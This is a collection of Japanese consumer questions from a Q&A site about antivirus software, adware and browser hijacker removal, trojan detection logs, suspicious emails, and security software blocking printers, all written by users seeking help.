Win8.1を起動したとき、添付の通り、“explorer.exe - 正しくないイメージ”と表示されます。 そこで、“explorer.exe”を再インストールしようと思い、“explorer.exeエラー”で検索して、IBMのホームページからEXPLORER.EXEをダウンロードするようにと、読みました。 http://www.solvusoft.com/ja/files/%E3%82%A8%E3%8 … ここをたどると、次のところに、3710のEXPLORER.EXEが見つかりました。 http://www.solvusoft.com/ja/files/%E3%82%A8%E3%8 … %E3%82%A6%E3%82%A4%E3%83%AB%E3%82%B9/exe/windows/e/page/38/ 質問を二つ 1.上記二つのURLには共に、solvusoftなる会社が顔を出します。 この会社を信じてもよいのでしょうか。 2.まずexplorer.exeをアンインストールする必要ありと思いますが、コントロールパネルからは見つかりません。
ノートンインターネットセキュリティーの３年保障版を使っているものです。 使っているパソコンは、ノートパソコンで、無線ランで使用しています。 １年９か月問題なく印刷できてましたが、ノートンを更新したらセキュリティー が強すぎて、急に印刷できなくなりました。 ノートンを使いながらプリンターを使う為には、ノートンでプリンターを使えるように 、設定したいのですが、どのように操作してよいか解りません。 操作方法を教えて頂きたいのですが・・・。　すみませんが宜しくお願いします。
新規購入のデスクトップパソコン（windows8.1）のセキュリティーソフトの期限が切れていたので、ESETセキュリティソフト（ESET Smart Security）の体験版 http://www.eset-smart-security.jp/ を試してみたところ、 C:\Users\*******\ダウンロード\ZipExtractorSetup(1).exe - Win32/Kryptik.BWJCの亜種 トロイの木馬 - 削除によって駆除されました - 隔離しました [1] C:\Users\*******\ダウンロード\ZipExtractorSetup(2).exe - Win32/Kryptik.BWJCの亜種 トロイの木馬 - 削除によって駆除されました - 隔離しました [1] C:\Users\*******\ダウンロード\ZipExtractorSetup(3).exe - Win32/Kryptik.BWJCの亜種 トロイの木馬 - 削除によって駆除されました - 隔離しました [1] C:\Users\*******\ダウンロード\ZipExtractorSetup.exe - Win32/Kryptik.BWJCの亜種 トロイの木馬 - 削除によって駆除されました - 隔離しました [1] 以上の画面が出ました。 しかし、一番下に注意書きが2つあり、 「[1] ウイルス本体のみで構成されていたため、ファイルは削除されました。」 「[4] ファイルを開くことができません。ほかのアプリケーションまたはオペレーティングシステムが使用中の可能性があります。」 との表記があります。 （2つ目の注意書きは開けなかった、関係のないほかのファイルのことだと思いますが・・・） これは「亜種 トロイの木馬」は削除され、ひとまず安心と考えていいんでしょうか？ それとも、削除はされたが、やっぱりリカバリーが必要などの事後対策が必要なんでしょうか？ 体験版の表示をprint screenでペイントを使って画像添付しようと思いましたが、なぜかアップロードすることができませんでした。 パソコンは10年くらい使ってますが、詳しいことは分かりません。よろしくお願いします。
PCの動作が何らかの事情で重くなり（たとえば知らずにウイルスに感染した、等）Dドライブを初期値に戻したが、その戻した時期がESETアンチウイルスソフトをインストールする前の日付だった場合、ESETも自動的にアンストールされた状態になりますね。　この場合、どのようにしたらESETアンチウイルスソフトを再インストールできますか？ ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
プリンターの初期設定で間違えて、プリンター自身で動くを選んでしまい、パソコンにインストールできないです。どうしたらパソコンと連動できますか？ ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
WIN８.1 　64bit　インターネットはIE11です、よろしく PCの調子が悪くなったのでホームページで調べているうちにうっかり変なものをクリックしたらしくHPのスタート画面が「webssearches.com 」になってしまいまして、インターネットオプションでスタート画面を「yahoojapan」にしても「webssearches.com 」になってしまいます。 右上のホームボタンをクリックすると「yahoo」になります。 困ってます、はじまから「yahoo」になる方法を教えて下さい。
ある日からインターネットを立ち上げると"trovi"というページが開くようになりました・。 ネットで調べた結果よろしくないブラウザページのようで削除方法を調べました、その結果タスクマネージャーから 「Search Protect」 「SPRunner.exe」 「cltmng.exe」 「CltMngSvc.exe」 これらを停止させCドライブ上から削除すると書いてありましたが、これらが不王子されていません。 これらが表示されない訳、他に削除方法があると知っている方教えて下さい。 現在はセキュリティソフトで止めていますが完全に削除をしたいので宜しくお願いします。
マックでOSを最新のものにしました。タイトルのとおり印刷はできるのですがこれまで使えていたスキャンができなくなりました。何故なのか対処の仕方を教えてください。ちなみにプリンターはMG6530です。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
閲覧ありがとうございます。 少し前ですが、入れた覚えのない拡張機能が追加されていて 消しても消しても気付くと新たな拡張機能が追加されているということが起きました。 追加されていると気付いた時点ですぐに削除していたのですが いくら削除してもどんどん新たな拡張機能が勝手に追加されました。 そのため、多分ウィルスかなにかが入っているのかと思ったので 怪しげなプログラムはアンインストールしました。 その後、勝手に拡張機能が追加されるということは無くなったのですが 最近Webサイト閲覧中に新たなタブを開くと 勝手に他のサイトに飛ばされることが頻繁にあります。 自己判断ですが詐欺サイト、ウィルスサイトのようなものだと思うので 飛ばされたら出来るだけ早めにタブを閉じるようにはしています。 また、サイト閲覧中の広告なども「パフォーマンスが低下しています」等の ウィルス広告、詐欺広告が表示されています。 現在自己判断ですが怪しげなプログラムは見当たらず 怪しげな拡張機能も入っていません。 WebブラウザはGoogle chromeを使用し ウィルス対策はフレッツ・ウイルスクリアを入れています。 初心者な為、拙い説明で申し訳ありません。 なにかこれらについて対策をご存知の方いらっしゃいましたらご教示お願い致します。
JAVA VMのインストールで ASKもインストールしたらしくコントロールパネルからアンインストールできません!JAVA VMもです。 デスクトップ上にも表示が張り付き迷惑です。 どうしたらアンインストールできる方法お教えください。 よろしくお願いします。
WinZip® Registry Optimizer を不用意にも、無料ダウンロードしてしまい、なにやら、ＰＣ内部をチェックされました。 そして、５００以上のエラーが表示され、それを修復するため、次に進むと４６００円ほどのソフト購入を求めるページに行き着きます。 不用意でした。 無料ダウンロードしたことにより、何か当方のＰＣに影響はないでしょうか。ＰＣ内の情報は漏れないでしょうか。 削除のしかたは、ＷＥＢで調ましたらたくさんありました。 とにかく心配なのは、ＰＣ内部の情報漏えいです。 この点についてどなたか教えてください。
インターネットで購入したプログラムがダウンロードされません ダウンロードの方法を教えてください ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
年末に近づき、年賀状の印刷を行っています。どうしても年賀状印刷中にエラーが出て、印刷が途中で停止してしまうので、最近PCの環境が変わったことを思い起こすと、ウイルスバスターからAVG(フリー)に変更し、ルータにはi-Filterを導入しました。 ルータの下にPCとプリンタが同じサブネット環境にぶら下がっている状態です。 そこで、ルータは関係ないだろうと考えて、AVGだけアンインストールしたところ、プリンタが使用できるようになりました。 PCはBuffalo製のルータ（WPL-05G300）に直接LAN接続してあります。PCはWindows8.1(64bit)です。 プリンターは、EpsonのEP-901Fで、ルータとPLC接続した別の部屋にあるWPL-05G300と無線LANで接続されています。 PCはWindows8.1のWindowsDefenderにはウイルス駆除機能が付いているので、AVGをアンインストールしたままでも問題ないのですが、より検出能力がある（と思われる）AVGを常駐させておきたいので、設定の不備で解決できる問題なのか、どうしようもないことなのか、わかる方に教えていただけたらと思います。
ウイルス感染についてですが今日携帯を使っていたら突然ウイルス感染の警告が来ました。 11個のウイルスに感染しているとでてきのですがこんなの初めてでよく分からなかったのでスキャン？アプリをとってみたところ、安全と出てきたのですがこれは信じて良いのでしょうか？(LINEアンチウイルス)です。 迷惑メールがひどく、間違えてURLを押してしまったのかな？と思っています。覚えはありませんが。 スマホはandroidのXperiaです。 心配なので詳しい方回答よろしくお願いいたしますm(_ _)m
キングソフトのウイルス対策ソフトをダウンロードしたのですが 「KINGSOFT Internet Security 2015」がデスクトップにあります。 これを わざわざ起動して何か作業する必要はあるのでしょうか？ ウイルス対策ソフトをインストールしたら、 勝手にウイル薄対策をしてくれるとも追ってるのですが、 「KINGSOFT Internet Security 2015」を起動して何かやる必要があれば教えてください。 インターネットは閲覧のみしかしません。
パーソナルセキュリティーを昨日初めてインストールし、使用しております。 パソコン画面左上に１cm×３cmほどの　サポート情報　というのが あり、邪魔です。削除するにはどうすればいいですか。 わかる方　教えてください。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
以下のメールが届きました。信じていいでしょうか？ 「お客様のアカウントは何らかの取引に利用されている恐れがありますので、お手数ですが、システムにログインして、異常がないかご確認いただきますようお願いします。 :株式会社スクウェア•エニックス 」 よろしくお願いします。
印刷しようとしたら6C10と表示され印刷できない ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
macについて教えて下さい 以前はいらない、と聞いていたのですが　セキュリティソフトは必要ですか？ もし　必要であればおすすめを教えていただけますか。　 よろしくお願いします。
こんにちは。 よろしくお願いします。 フリーのアンチウイルスソフトavast!でウイルスのスキャンをしたところ「maintainer」というファイルに関連した(exeやbak他)が6つほど出てきました。 チェストに移動と削除をしてみましたが、エラーでアクセスできませんとなってしまいます。 これらは、やはりウイルスなのでしょうか。 どうしたら削除できますか？ パソコンは、富士通のノートパソコン、OSは、windows7です。
Nortonのアンチウィルスソフトを使用していますが、パソコンを立ち上げるたび、あるいはそれ以上の頻度で「SearchProtectが検出されました。」と画面が出てきて対処しなければなりません。 いちいち対処するのが煩わしいです。確認せずに、自動的に対処する方法はないでしょうか。 この現象は、Nortonの何かの設定で「確認する」をクリックして以降に生じるようになりました。 Nortonの何かの設定を厳格にし過ぎたのではないかと思っています。 ご教示、よろしくお願い申し上げます。
少し前にアバストの有料版をインストールしたのですが、その後パソコンがおかしくなってしまい初期化しました。 それで再インストールしようとしたのですがやり方がわかりません。 MyAvastというマイページ的なところにはいけるのですが、購入履歴のような項目がなくて何もできません。 電話で問い合わせしても毎回通話中みたいになって繋がらず、メールを送っても一つも返信がありません。 かれこれ２週間近く経っています。 最悪この金額(１年分)は諦めようとも思っていますが、支払いをクレジットカードで済ませたため１年後に自動更新とかになってしまったらどうしようと困っております。 アバストと連絡を取る方法、又はクレジットカード支払いの場合に自動更新になるかならないかをご存知の方がおりましたら教えていただきたいです。 よろしくお願い致します。
Windows Defenderを使用しているんですが、ファイル等にウィルスが入っていないか調べるために 右クリックでスキャンすることは出来ないのですか？ ノートンやウィルスバスター等には「○○でスキャン」と表示されるのですがWindows Defenderには無いのですか？その場合どうしたらいいんでしょうか？
「pws win32 zbotというウィルスをＭＳＥが検出しましたので、削除を実行しました。」 「いつ削除されたか知りたい場合は、MSEの履歴を見てください」 「念の為、パスワード等を変更してください。」 とPCからメッセージが出たのですが、 これは削除したからもう大丈夫、ってことで良いんですか？ 「MSEの履歴を見てください」とあったので見に行ったのですが、それらしいのはなく、確認できませんでした。 一応指示通りに、日ごろからよく使っているサイトのパスワードは変更しました。 これで良いんでしょうか。解決になってますか？ もっと他に確認方法とか、あるんでしょうか。 あれば教えてください。 ちなみに詳しい経緯は ＰＣを見てたらいきなり電源が「ブツッ」と切れて、(コンセントはきちんと差してあります) 電源を入れ直し、 バッテリーの充電が０から始まってたので何気なく見ていたら、 隣りにフラグが立ってて、確認したら上記の問題が出てきた、 と言う感じです。 ＰＣに詳しいわけでもなく不安でしたので、質問しました。
突然昨日からブラウザのダウンロードが失敗します。 複数のサイトで試しましたが、どうやら私側の問題のようです。 原因は別タブで新しいサイト見たりすると失敗します。 要するに、その時以降新しい通信？するとだめっぽいです。 分かりませんが、FirefoxでもChoromeでもだめでした。 ネットワークエラーだそうです。 こんなことがあるでしょうか。 私は、マルウェアの感染を疑っています。 MalwareBytesなど複数のソフトで洗ってみます。 ただ、根本的にプロバイダが工事中とか？ であれば、連絡あってもいいと思うのですが… 他に何か原因となりうるものがあれば教えてください。
最近 ネットのページを開くとjavaが古くなっていますというメッセージが出るのですがどうすればいいですか？ またページ上に広告みたいなのがわんさか出るのですがどうしたらよいでしょうか？
ダウンロードしてしまいました。 画像ファイルの種類変更を行ないたいと思いダウンロードしました。 挙動がおかしく、「まさか…」と思いGoogleで検索してみるとこれは危険なソフトだと言うことがわかりました…。 すぐにLANケーブルをPCから引っこ抜きプログラムのアンインストールに取り掛かると、Image Reszer以外にも、3つ知らないソフトがインストールされていました。 以下がインストールされていたモノです。 ・「Image Reszer」という言葉が入るプログラム名。焦り過ぎてわけもわからずクリックしていたら削除できたモノ。 ・Image Reszer Packges ・Extended Update ・Faster Light 上の通り、一つ目をなんとか削除。 しかし、二つ目の「Image Reszer Packges」の削除に取り掛かるがクリックしていくも削除できず。 ここでアンインストール方法がおかしいのかと不安になり残りの二つは手を付けず…。 PCに詳しく無いので、アンインストールしたいと思えば「コントロールパネル→プログラムのアンインストール→アンインストールしたいプログラムをダブルクリック」で消せるものだと思っていました…。 どなたかImage Reszer Packges、Extended Update、Faster Lightのアンインストール方法を教えてください。m(_ _)m また、これらが削除できたとすれば危険からは回避できたと言って良いのでしょうか？ 現在、ＰＣの電源は入っているもののLANケーブルは外してあります。 自分の無知さを痛感しています…ただこの問題が解決できるまで不安で使用がありません…。 使用PC ・Windows7
１台目のPCにESETを導入していますが、２台目のPCを購入したので、そのPCにESETを導入したいのですが、追加購入はどのようにすればよいでしょうか？　１台目のESETはダウンロード版です。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
Windows７ユーザーです。グーグルクロームをメインブラウザに、サファリをサブに使っています。 3日前からウェブ閲覧中に急に、どちらで見る時にも、リンクをクリックすると関係ないエッチサイトの新規ページが開いたり、クリックしたページもエッチページに切り替わったりするようになりました。 ロシアとかルーマニアとかのサイトのようです。 スカイプ受信のような妙なポップアップも上がったり下がったりしてよく現れ、目障りで仕方ありません。 別にエッチサイトを見たりソフトをインストールしたようなこともなく、急にそうなりました。 グーグルクロームとサファリを使ってますが、双方そうなってしまい困っています（涙） 自力で以下をやりましたが、直すことが出来ません。 －サファリとクロームの削除と再インストール、設定の初期化、閲覧履歴削除 －ウイルスバスターでスキャン　何も出ません －セーフモードで　ノートンイレイサーでスキャン　やっぱり何も出ません －スパイボットでスキャン　削除される項目は出るけど、問題は変化なし －Malwarebytes Anti Malware でスキャン　削除される項目は出るけど、問題は変化なし 今のところ、Anti Malware がある程度はブロックしてくれていますが・・・ それでもブロックされず飛ばされるページは似たページなのに気づき、とりあえずクロームの機能拡張にサイトブロックを入れて、登録したページが開くのはブロックしていますが、そもそも飛ばされてしまうことや妙なポップアップが出るのは防げません。 それから、なぜか、ipad と iphone のサファリにも同じ症状が出るようになってしまいました。 さすがにポップアップは出ませんが、急に変なページが開きます。 ウイルス？ かと思うと、ログインするようなサイトには何が影響するかわからなくて入らずにいます。 自力で解決はもうどうしようもないので、お智恵をお貸しください！ お願いします！
画像ソフトをNetからinstallしました。 その途中で導かれるまま、okして行くと、 “PCSpeedScan Pro”なるソフトもinstallしてしまい、いつの間にか、スキャンが始まりました。 頼んでいないソフトですので、数分たってキャンセルしました。 すると、添付の画面になりました。ここでは終了しました。 レジストリエラー81個、その他のエラーなしの状態です。 そしてPCを起動する度に修復するように促されるようになりました。 元々このPC、起動が遅いので何かする必要ありと思ってました。 そこで、効能通りだったら、画面に従い、修復するのがよいと、思っています。 本当によいか、修復ボタンを押す前に教えて下さい。 以上
パソコンポップアップ広告で困っています。パソコンに１か月ほど前からポップアップ広告が表示されるようになりました。Ｘビデオ（無料閲覧サイト）を閲覧してからだと思います。　削除が出来なくて困っています。削除の仕方をわかりやすく教えて頂けると助かります。どなたかお願い致します。
昨日itunesで　映画のイントゥザストームの映像特典を見ようとクリックしたら、映像が表示されませんでした。 そのタイミングで、ブラウザ(firefox)からネットに接続できなくなりました。 再起動したら、windows8からwindows8.1へのアップグレードがはじまり、8.1へアップグレードしました。 firefoxとIEでは、ネットにはつながらないが、comodo dragon (chrome) ではネットにつながった。 そのあと　ccleaner で　ゴミファイル等を削除。 AVGでウイルススキャンをしたが、ウイルスは検知されなかった。 今日になって、ネットにつながるか、試したら、　firefox と　IE でも　ネットにつながった。 この状態は、ウイルスに感染しているのでしょうか？ どうしたらいいのでしょうか？ 教えて下さい。
こんにちは たまにコンピューターのフォルダの中に「hosts.」というのが出てきます。ファイルの種類は「ファイル」とだけ書いてあり、開くことはできません。 これはウィルスか何かなのでしょうか？ お詳しい方お教えいただければ幸いです
ＦＡＸ，スキャナーをＰＣに接続しているのですが、セキュリティソフトを入れると、それが遮断されてしまいます どうしたら良いですか？ ＦＡＸのＩＰアドレスはわかるのですが・・・ ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
パソコンに入っていたウイルス対策ソフトの期限が切れる為、他社のウイルス対策を買いました。 元々入っていた他社の物をアンインストールしないとインストールが出来ないとのことでアンインストール済み。 ユーザー登録しようとしたところ、何度試してもGooglechromeが開かない。アンインストールして再インストールしたら良いという書き込みがあり、アンインストールしインストールしようとしたが、原因不明のエラーによりインストールが失敗と表示される。 ユーザー登録をセキュリティソフトのHPからしようとメールアドレスを登録し、メールを開いてユーザー名・パスワード取得用アドレスのリンクをクリック。→ファイルに対してプログラムが関連付けされていない。プログラムがインストールされている場合は既定のプログラムでプログラムを関連付けして下さい。と表示。 GooglechromeでしていたAmazonを開こうとしたらショートカットを開けません。プロトコルには登録されたプログラムがありません。と表示 パソコンはNECのWindows7を使っています。 Googlechromeのインストール方法を教えて下さい。
いつもお世話になります 携帯に誰かから　私のメルアドで私に上記のＵＲＬを含んだ メールが送られてきました。 何かのソフトを使えば　そういう事が出来るのでしょうか （すぐにwebメールは契約を停止しました 上記のＵＲＬにＰＣでアクセスしたら　御登録有難うございました と表示されました＝これは全く無視すればいいかと思いますが・・・）
先日パソコンのリカバリをした際 無料ウィルスソフト「キングソフト」 というのを入れました。 最初のころは、左下に出てくる広告は １日数回だったのですが、１ヶ月たった今は ３０分に１回出ます。そろそろ有料を 買えということでしょうか。有料なら ウィルスセキュリティを買おうと 思うのですが。
マカフィーの購入にクーポン番号というものがあるのですがこれは何ですか？ もしかしてコンビニで売っているVISAギフト券か何か等そういった類のものの番号を入力してマカフィーの製品を購入できるのでしょうか？ 私はクレジットカードを持っていないです。
今年の３月末に新しいパソコンを購入しました。インターネットに接続した後、パソコンの説明書に載っていたウイルスをインストールしました、無料期間が切れ６月にシマンテックの３年更新のウイルスに変えたのですが、１１月の半ばにパソコンの調子が悪くなりパソコンメーカーに問い合わせしたら、修理しますと言うことで直って初期化で戻りました。 インターネットを接続したら、また無料期間でウイルスを設定画面になって無料だから、設定したほうがいいですとインターネット接続を教えてくれた方が教えてくれ今、設定されいます。 無料期間は来年の２月半ばまでなんですが、６月にシマンテックの３年更新をダウンロードしたウイルスはどうなるのでしょうか？２月半ばの期限切れた時に、また６月にダウンロードしたのを使う事できますか？新しくウイルス商品を買わないとダメですか？
キャノンのMG3530プリンターがパソコンからは、印刷できるのですがプリンターからコピーすると、白紙で出てきてコピーできません。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
Internet Explorer のウィンドゥの左下に、マルウェアの怪しい表示が出るようになりました。 ＯＳは Windows7 です。 普段から、ソースネクスト製のセキュリティソフト『ウイルスセキュリティ』を使ってます。もっとも、それでも一度、マルウェアに感染したことはあります。そのときは、アンインストールの画面にマルウェアの痕跡が残っていたので、自力でなんとかなりました。 今回は、WinZip Malware Protector のディープスキャンを行っても消えません。 添付画像の左下の表示がマルウェアのものです。一応、バツ印をクリックすると消えるのですが、別のウィンドゥを開いたりすると、また現れます。 どうやったら消えますか？
初めて質問させて頂きます。 internet explorerを立ち上げると、www.default-search.net/?なるページに飛びます。reimageの、しつこくリペア勧める画面です。 microsoft security essentialとreimageに関するものは、全てアンインストールし、ファイルの検索をかけても引っかからないのですが、まだ何か残っているのでしょうか。 消去、或いは除去する方法があれば、宜しくご教授下さい。
ノートンインターネットセキュリティの有料版をネットからインストールして1年経つ者です。 今朝Googleを開こうとしたら繋がりませんでした。 詳細を見てみるとファイアウォールに 問題があるかもしれないと出ていたので、切ってみると繋がりました。 ちなみに別々の場所で別々の無線LANを 使用しましたが、両方で同じように繋がりませんでした。 しかしそのまま使い続けることはできないので、調べてみると設定→スマートファイアウォール→ネットワーク→プログラムの制御で設定するという方法があったので試してみようとしましたが、設定をクリックしても開く事ができず何も反応しませんでした。 問題点としてはGoogleChromeにうまく接続できない→ファイアウォールを切るとうまく行く ノートンインターネットセキュリティの 設定を押しても何も反応しない の2点です。 どこに原因の可能性があるかご存知の方いましたらよろしくお願い致します。 使っているパソコンはFUJITSUのLIFEBOOK SH54/Ｋ です。 GoogleChromeに出ているエラーコードはERR_TIMED_OUT です。
グーグルクロームをインストールしました。ウィルスバスターをいれていますが、Trendツールバーが出てなくて慌ててストアからバスターのツールバーをインストールしたのですが、これでウィルスバスターに保護されているのでしょうか？なくても保護されるているのでしょうか？クロームはインストールしただけで最初の設定画面のメールもアカウントも入力していません。特にバスターはなにも弄らなくてよいのでしょうか？簡単な事も分かってないと思いますがよろしくお願いします。
ＮＴＴ光　プレミアムマンションタイプ　プロバイダーはＯＣＮで契約しています。セキュリティーはＮＴＴにて提供されているセキュリティー対策ツールを利用しています。 さきほど、セキュリティーに関して、調査の電話があり、セキュリティー対策ツールはサーバーから、はいったあとを監視するもので、サーバーに入るまでの部分、サーバー内での監視を強化するためのセキュリティーを無償で提供できます、という勧誘の内容でした。 サービス説明の女性の話では、そのためには現在のＯＣＮからアイ　スマートというＮＴＴ専属プロバイダーである当社に切り替え、現行使用料とほぼ同額などということでした。 申し込みする場合は、あとから営業の担当がまた電話する、申し込み方法はその電話で、というかなり不審な話であり、ひとまず検討する旨連絡して電話を切りました。 ＮＴＴ専属プロバイダーですが、ＮＴＴが関与して指定しているプロバイダーではない、選択するのは 利用者です、ともいってました。 セキュリティー度を高められるのは、よいとはおもいますが、話の真偽のほどがわからず ＯＣＮであれば、別途有料のところが無料で提供できるという話ですが、こういう内容についてどちらに、確認すべきかわからず、こちらにひとまず相談となりました。 おしえていただければ、幸いです。
windows8.1では、defender が入っていますが、これがあればウイルス対策ソフトは不要なのですか。
こんにちは。大学でUSBがウイルスに感染したのか、._.Trashes、Spotlight-V100などの見覚えのないファイルが作られています。もともとあったファイルのデータが消えたり、変更されたりしているわけではないのですが、ファイルフォルダがなぜかショートカット化されています。 ウイルスバスターでパソコンとUSBをスキャンしたのですが、何の異常もありません。 しかし、消しても消しても謎のファイルが消えず、とても怖いです。 ウイルスは本当に怖いものと認識していますが、電気屋さんに持っていかなければならないのでしょうか？ 同じような経験をされた方、ウイルスに詳しい方、ご回答よろしくお願いします。 不安で夜も眠れません・・・
マカフィーアンチウイルスプラスを使ってます　 パソコンをリカバリしてから入れ直したのですがマカフィーからダウンロードしたセットアッププログラムを起動すると途中まで行くと「ダウンロード実行できません　ダウンロードサーバーに接続できません～～」と出ますが、そのときでもインターネットはつながってたのに何故かネット環境が駄目と出ます 仕方が無いので円盤からセットアップしたのですがちゃんとインストール出来たにも関わらず　ご契約情報で「ソフトのセットアップがされてません」と出るのでシリアルとパスを入れたのに何度もセットアップ出来てないって言われてしまいます ネット調べても該当トラブル無いのでどなたか解決策ありましたらお願いいたします
Mac でcyber securityの更新をして、アクティベーションでError 0008が出て、サポート情報にある方法を試しましたが、やはり同じでした。さらに、Club ESETにもメールアドレスが登録されているのにログインできません。有効期限は2015年11月に更新されているのに、何か方法がありますか。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
最近、ネットを見ていると「今使っているＪＡＶＡは古いので、すぐアップしてください」と表示され、画面が動かなくなります。アドレスを見てみると、ＪＡＶＡという文字はありません。虚偽のように思えるのですが、×で消すと、インストール画面になります。ウイルスバスターを入れているのに、効果がないようです。止まってしまって困っています。対処法をご存知の方、ぜひご教示ください。
公衆WiFiの利用は危険性がありますか？
ＰＣモニターとプリントアウトした時の写真の色合いが違うのはなぜでしょう 機種はＭ６２３０でインクも充分にあり　用紙も純正のキャノンの用紙です ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
以前中古のパソコンをオークションで買いましたが、買った当初からたまにパソコンが夜中に勝手に起動します。 今もコピー機が勝手に動いて目が覚めパソコン画面を見ると全くいじっていないのにパソコンの画面が付き、メール画面が開きました。 私はその間全く触っていないです。 画面を見るといつもゲームをしていて大きい画面にして見ているのですが、最小化されており、もう一つ最小化されたインターネット画面が表示されていました。 明らかに遠隔操作だと思うのですが、この場合ウイルス対策ソフトを入れたら遠隔は治りますか？また遠隔操作の場合どこまで個人情報は流れてしまうのでしょうか？ このパソコンでアマゾンの出品などもしています。 パソコンに詳しい方回答お願いします。
こんにちは。 今日海外のサイトのフリーソフトをダウンロードしたら、 ・いきなりMacを修復や海外の通販サイト等のウィンドウがでる ・検索バーがGoogleの設定なのにonly searchという検索エンジンになる ・ホームページの設定がGoogleに設定してもブラウザを終了するとホームページがonly searchになってしまう という症状がでるように…。 Adblock Plusというソフトをダウンロードしてみましたが、広告はブロックされても通販のサイトに飛んだり検索バーやホームページの設定のことまでは治りませんでした。 TSM Adware Removal ToolというソフトもDLしてみようと思いましたがDLできず…。 このMacは OS X バージョン10.9.4、Safariはバージョン7.0.5です。 文章が拙くてすみません、解答よろしくお願いします。
新しいパソコンをかったのですが、マカフィーのむりょうきかんが過ぎたので、更新してください。のメッセージが、更新したら7250円もかかりました。これって必要？
Windows7Pro64bit ブラウザChrome使用 様々なサイトで、 「お使いのJavaのバージョンは古く、セキュリティリスクがあります 今すぐ更新してください。」 とのメッセージが表示され、何らかのファイル（setup.exe）がダウンロードされてしまいます。 原因は「Lyrics-Pal Update」の存在のようで、 AdwCleanerというソフトでの駆除を紹介するサイトがあり、試してみたのですが、 検知してくれるのですが、削除はしてくれません。 AdwCleaner上の「除去」ボタンを押すと再起動が掛り、 再起動後、「Lyrics-Pal Update」は消えていません。 まともにネット参照ができず非常に煩わしいこの「Lyrics-Pal Update」を削除するにはどうすればよいでしょうか。
hard-diskが破損して、交換したためバージョン、シリアル番号、ユーザIDのいずれもわかりません。以前のメールもすべて復旧できませんでした。 体験版のインストールまではできていますが、ライセンス情報を再度送信してもらう方法を教えてください。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
アダルトサイトの請求画面の削除の仕方をご教授下さい。 登録した覚えのない、 「　アダルトサイト[ マーチ]ご登録ありがとうございます。」と表示が出て困っています。 削除方法をどなたか教えてください。　よろしくお願いいたします。 過去のOKWaveで同様な質問と対策内容はあったのですが、いずれのものもWindou8よりも古い時代のもので、そのまま参考することができませんでした。
初めまして。 windows7　proffecionalでESET SMART SECURITY 6を利用しています。 パソコンの画面の下、タスクバーが表示されるあたりに「ESET SMART SECURITY 6」と書かれた青色の画像？が表示され消えません。また、youtubeなど全面表示にした際も消えずに、字幕に覆いかぶさったままの状態です。消す方法はありますでしょうか。 お力をお貸し下さい。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
本日ウィルスバスタ　クラウドにバージョンアップしました。 立ち上げ画面にウィルスバスタのアイコンが貼り付けられました。 従来のウィルスバスタのアイコンは使用価値がないと思い削除しょうと思いました。 すると下記の文言が記されました。 TTi_HE_Download_64bit　←旧ウィルスバスタのアイコン 〈削除するには管理者のアクセス許可を提供する必要があると記載されました！〉 旧ウィルスバスタのアイコンは不必要で目障りなため削除したくてもできませんでした。 質問です。 ●旧ウィルスバスタのアイコンを削除するためにはどうすれば良いでしょうか？ 皆さんはわざわざ削除せずそのまま放置しているでしょうか？ よろしくお願いいたします。
パ ソコンの立ち上がりが非常に遅いがなでか。またインターネットのつながりが非常に悪い ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
ウイルススキャンを実行すると、 　　C:\autorun.inf が感染しているとの結果を受けました。 そして「操作の実行」を選ぶと他の感染ファイルに対して 　　ファイルを隔離 が実行されました。この「ファイルを隔離」の意味も分かりませんが、もっと不安なのは 　　C:\autorun.inf に対しては 　　ウイルスを駆除できませんでした なる結果になったことです。 故に手動で削除しようとしたのですが、エクスプローラーでは見えません。 どうやったら削除できるのでしょうか。
最初、OUTLOOKの迷惑メールフォルダに、アルファベット表記の見知らぬ女性の名前のメールが届いていました。 「おっ、これがスパムメールか？」と思いました。 「こんなのやっている輩ってホントにいるんだ」と思いつつ、メールを削除しました。 ネットを始めて数年経ちますが、初めてスパムメールが届きました。 後日、また迷惑メールフォルダに同一人物からスパムメールが届いていました。 今度は、「LINEで自分の裸の写真を見て…」みたいな記事とリンクが貼られていました。 即削除しました。 すると、またまたスパムメールが届きました。 いい加減続くので、プロバイダーで受信拒否の登録をしました。 すると、今度は違うメールアドレスのスパムメールが届きました。 今までとは文面が変わって、如何にも怪しいサイトに飛ぶようなリンクが貼られていました。 これも受信拒否の登録をしました。 ここまで連発したので、クレジット会社に連絡をして利用状況を確認しました。 今のトコロ、不正利用はされていませんでした。 「同一人物が複数のメルアドを利用している」、もしくは「複数のスパマーに拡散している」と推測します。 問題はどこから情報が漏れたかなんですが、私の情報を登録している通販サイトや企業などのHPを確認した所、個人情報の漏洩に関する記事は見当たりませんでした。 まだ通販サイトや企業が気付いていないのか判りません。 こういった場合、通販サイトや企業に個人情報の確認の問い合わせをした方が良いのでしょうか？ ご教示お願いいたします。 追記 自衛策として、私の「メールアドレスの変更」・「クレジットカードの変更」をしたいと思います。
サイトのブロックが二日連続で出たため、ウィルスチェックをしたら2件駆除、隔離されました。下記はどのようなものでしょうか？カード／銀行のインターネットページの真依ページを見ていたこともあり情報が盗まれるタイプのものか心配しています。ご協力よろしくお願いします。下記にログを記載します。 C:\Users\masa\AppData\Local\Google\Chrome\User Data\Default\File System\001\t\00\00000000 > NSIS > Script.nsi - Win32/AdWare.1ClickDownload.AW アプリケーション - 削除によって駆除されました - 隔離しました C:\Users\masa\AppData\Local\Google\Chrome\User Data\Default\File System\002\t\00\00000000 > NSIS > Script.nsi - Win32/AdWare.1ClickDownload.AW アプリケーション - 削除によって駆除されました - 隔離しました ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
